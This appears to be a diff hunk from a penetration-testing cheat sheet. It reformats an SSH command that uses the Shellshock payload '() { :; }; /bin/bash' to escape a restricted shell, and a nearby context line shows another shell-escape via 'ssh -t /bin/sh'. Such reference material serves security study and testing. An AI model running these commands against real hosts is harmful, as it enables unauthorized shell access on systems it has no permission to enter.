@@ -87,7 +87,8 @@ ssh $USERNAME@TARGET_IP -t "/bin/sh" or "/bin/bash"
 ```
 
 ```shell
-ssh $USERNAME@TARGET_IP -t "() { :; }; /bin/bash" (Shellshock)
+#shellshock
+ssh $USERNAME@TARGET_IP -t "() { :; }; /bin/bash"
 ```
 
 Login using SSH key file
